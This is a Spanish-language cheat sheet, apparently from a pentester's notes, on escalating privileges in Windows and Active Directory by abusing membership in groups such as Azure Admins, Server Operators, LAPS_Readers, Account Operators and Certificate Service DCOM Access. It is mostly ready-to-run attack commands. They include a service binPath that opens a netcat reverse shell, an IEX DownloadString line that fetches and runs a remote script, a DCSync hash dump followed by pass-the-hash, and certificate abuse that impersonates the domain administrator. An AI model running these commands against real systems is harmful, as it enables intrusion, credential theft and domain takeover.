# Grupos Especiales 

Tags: #Windows #PrivEsc #GruposExpeciales 

## Grupos Windows para escalar 

```bash 
❯ net user <user>     # Mirar los grupos del usuario 
	# <user> = Nombre del usuario actual 
```

```powershell
1. 'Azure Admins' = Si puedes acceder a Azure AD Connect desde un usuario del grupo 'Azure Admins', puedes extraer credenciales privilegiadas y 'escalar a Domain Admin'.


Pasos: 
❯ https://github.com/VbScrub/AdSyncDecrypt/releases/tag/v1.0   # Descargar el archivo AdDecrypt.zip y extraer su contenido para obtener 'AdDecrypt.exe, mcrypt.dll' y transferir los archivos a la máquina Windows comprometida
❯ 'C:\Program Files\Microsoft Azure AD Sync\Bin'  # Ir a la siguiente ruta en Windows para ejecutar el 'AdDecrypt.exe'
❯ AdDecrypt.exe -FullSQL      # Ejecutar la herramienta para extraer credenciales del usuario Administrator 

Notas: 
	1. El AdDecrypt.exe y mcrypt.dll se deben de encontrar en la misma carpeta
```

```powershell 
2. 'Server Operators' = Si pertenece a este grupo en un sistema Windows, se tiene ciertos privilegios elevados 'localmente' sobre los servidores y se puede 'iniciar, detener, configurar, crear, reiniciar realizar backups' sobre los servicios existentes.


Pasos:
❯ nc.exe     # Descargar y tranferir el archivo a la máquina Windows comprometida para hacer la Revershell
❯ services   # Mirar todos los servicios que se estan ejecutando en Windows 
❯ sc.exe create <service> binPath="C:\Users\omar\Desktop\nc.exe -e cmd IP 443"   # Crear un servicio 
❯ sc.exe config <service> binPath="C:\Users\omar\Desktop\nc.exe -e cmd IP 443"   # Modificar un servicio 
❯ sc.exe stop <service>         # Detener un servicio 
❯ sc.exe start <service>        # Iniciar un servicio 

Notas:
	1. Antes de iniciar el servicio, en Kali se debe de estar en 'listening' con 'Netcat' para establecer la Revershell 
```

```powershell 
3. 'LAPS_Readers' =  Los miembros del grupo 'LAPS\Readers' tienen 'permiso de lectura' sobre los atributos de Active Directory donde se almacenan las 'contraseñas locales administradas automáticamente'. Por lo tanto, se puede leer la contraseña del administrador local de las máquinas unidas al dominio, conectarte con esa contraseña y tomar el control de la máquina como 'administrador local'.


Pasos:
❯ https://github.com/kfosaaen/Get-LAPSPasswords   # Descargar 'Get-LAPSPasswords.ps1' y transferirlo a la máquina Windows comprometida
❯ IEX (New-Object Net.WebClient).DownloadString('https://IP/Get-LAPSPasswords.ps1')  # Importar el modulo 
❯ Get-LAPSPasswords          # Ejecutar la función para obtener la password de Administrator
```

```powershell
4. 'Account Operators' = Si se esta en este grupo con derechos de 'GenericAll' sobre el grupo 'Exchange Windows Permissions' se puede crear un usuario y agregarlo al grupo. Además, si el grupo de 'Exchange Windows Permissions' tiene derechos de 'WriteDacl' sobre el dominio, se puede ejecutar un DCSync para obtener los hashes de todos los usuarios y hacer un Pass-The-Hash


Pasos:
❯ net user omar P4ssw0rd /add /domain       # Crear un usuario a nivel de dominio por pertenecer al grupo 'Account Operators' en Windows 
❯ net group "Exchange Windows Permissions" omar /add     # Agregar al usuario al grupo 'Exchange Windows Permissions'
❯ net group        # Mirar los grupos existentes 
❯ net user omar    # Mirar la info del usuario 


# Agregar el privilegio de DCSync al usuario  
❯ $SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
	# password = Contraseña del usuario creado 
	
❯ $Cred = New-Object System.Management.Automation.PSCredential('domain1.local\user', $SecPassword)
	# user = Usuario creado 
	# domain1.local = Dominio 

❯ Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=domain1,DC=local" -PrincipalIdentity user -Rights DCSync 
	# user = Usuario que se agrego en la variable $Cred

Notas: 
	1. El comando de 'Add-DomainObjectAcl' solo se puede ejecutar cuando se carga el módulo de 'PowerView.ps1'


# Hacer DCSync en Kali 
❯ impacket-secretsdump domain1.local/user@IP-DC    # Ejecutar el DCSync con el usuario creado
	# IP-DC = La dirección IP del DC  

❯ impacket-psexec domain1.local/Administrator@IP cmd.exe -hashes :HashNT   # Utilizar 'psexec' para ingresar con el usuario 'Administrator' haciendo 'Pass-The-Hash'    

NOTA:
	Utilizar el hash NT
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
	Donde:
		- 32693b11e6aa90eb43d32c72a07ceea6 = HASH NT 
		- aad3b435b51404eeaad3b435b51404ee = HASH LM
```

```powershell 
5. 'Certificate Service DCOM Access' = Acceso remoto vía DCOM al servicio de Certificate Authority (CA).  
Esto significa que los usuarios de ese grupo pueden interactuar con la CA de forma remota (por ejemplo, para solicitar certificados). Además, debe de existir una plantilla vulnerable en la 'CA' como: 'Enrollee supplies subject, client authentication (OID)' y no tener restricciones de grupo


Pasos:
# Enumerar con Kali el 'AD CS' para ver si hay vulnerabilidades
❯ certipy find -ns IP -u 'user' -p 'password' -dc-ip IP -target IP   
	# IP = Es la dirección IP del DC
	❯ cat file_certipy.txt | grep Vuln -C 50      # Mirar las 50 lineas donde existe la vulnerabilidad con el CA y el template 

❯ certipy req -username user@domain.corp -password passwd -target-ip IP -ca 'CA' -template 'template_name' -upn 'administrator@domain.corp'        # Solicitar con Kali el certificado del usuario 'Administrator'
	# ca = Es el 'Certificate Authorities' y se encuentra en el archivo enumerado anteriormente 
	# template = Es la plantilla vulnerable y se encuentra en el archivo enumerado anteriormente
	# upn = El usuario al que queremos suplantar 
	# user = Es el usuario que se encuentra en el grupo 'Certificate Service DCOM Access' 
	
❯ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'domain.corp' -dc-ip IP  # Solicitar con Kali el TGT  del usuario 'administrator' con el certificado 'PFX' y obtener el hash NTLM  

❯ impacket-wmiexec domain.corp/administrator@IP -no-pass -hashes 'LM:NT'    # Ingresar a Windows desde Kali con el usuario administrator 


Notas:
	1. Sincronizar Kali con el DC 
		❯ ntpdate IP_DC
	2. Al solicitar el certificado se debe de mostrar lo siguiente: 'Saved certificate and private key to administrator.pfx'
```